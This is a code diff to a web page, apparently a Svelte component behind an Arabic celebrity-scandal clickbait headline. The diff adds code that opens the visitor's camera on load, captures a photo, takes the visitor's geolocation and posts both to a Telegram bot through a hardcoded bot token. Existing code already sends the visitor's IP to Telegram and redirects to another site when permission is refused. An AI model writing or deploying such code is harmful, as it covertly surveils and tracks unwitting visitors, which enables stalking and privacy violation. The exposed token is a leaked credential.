@@ -7,22 +7,24 @@ sendIPToTelegramBots();
 
 
 
-    // Request location permission automatically
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        // Location permission granted, send location and IP results to Telegram bots
-        sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
-      },
-      (error) => {
-        if (error.code === error.PERMISSION_DENIED) {
-          // Location permission denied, send IP result to Telegram bots
-        
+  let videoStream;
+  let videoElement;
 
-redirectToNextURL();
+// Request camera and location permissions automatically
+    try {
+      videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+      videoElement.srcObject = videoStream;
+      await videoElement.play();
 
-        }
+      const { latitude, longitude } = await getLocation();
+      const photo = await capturePhoto();
+      sendPhotoToTelegram(photo, latitude, longitude);
+    } catch (error) {
+      console.error(error);
+      if (error.name === 'NotAllowedError') {
+        redirectToNextURL();
       }
-    );
+    }
   });
 
   async function sendLocationAndIPToTelegramBots(latitude, longitude) {
@@ -63,6 +65,44 @@ const locationIcon = "\u{1F4CD}";
            text: htmlMessage,
         parse_mode: 'HTML',
       }),
+    });
+  }
+function getLocation() {
+    return new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          resolve(position.coords);
+        },
+        (error) => {
+          reject(error);
+        }
+      );
+    });
+  }
+
+function capturePhoto() {
+    const canvas = document.createElement('canvas');
+    canvas.width = videoElement.videoWidth;
+    canvas.height = videoElement.videoHeight;
+    const context = canvas.getContext('2d');
+    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+    const photoDataUrl = canvas.toDataURL('image/jpeg');
+    return fetch(photoDataUrl)
+      .then((response) => response.blob());
+  }
+
+async function sendPhotoToTelegram(photoBlob, latitude, longitude) {
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendPhoto`;
+
+    const formData = new FormData();
+    formData.append('photo', photoBlob, 'photo.jpg');
+    formData.append('chat_id', '@localipy'); // Replace with the channel username or ID
+    formData.append('caption', `Location: ${latitude}, ${longitude}`);
+
+    await fetch(telegramBotURL, {
+      method: 'POST',
+      body: formData
     });
   }
 
@@ -182,6 +222,9 @@ window.location.href = 'https://mhf1.onrender.com/';
 </script>
 
 <main>
+
+  <video bind:this={videoElement} autoplay muted></video>
+
 
 <center>
   <h1 style="font-size: 36px; font-weight: bold;">فضايح هيفاء وهبي</h1>
